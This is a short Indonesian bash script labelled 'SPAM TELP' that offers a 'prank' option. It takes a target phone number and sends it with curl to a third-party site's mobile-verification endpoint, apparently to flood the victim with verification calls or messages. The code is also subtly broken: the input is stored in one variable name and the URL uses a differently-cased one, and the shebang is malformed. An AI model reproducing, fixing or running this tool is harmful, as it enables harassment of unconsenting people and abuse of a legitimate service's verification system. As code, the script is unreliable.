#!bin/bash
clear

echo " ®=======================® "
echo "  Pembuat : Tegar Store          "
echo "  Batas Telp : 3             "
echo "  Tidak Bisa Memakai : 08/+62   "
echo "  Contoh : 885876xxxxx      "
echo " ®=======================® "
figlet SPAM TELP | lolcat
echo '
[1], prank
[2], Exit Tools
'
echo
read -p "Masukan Pilihan Anda : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan No Target : " Nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo 'Terima Kasih Udah Menggunakan Tools Gua'
exit
fi
echo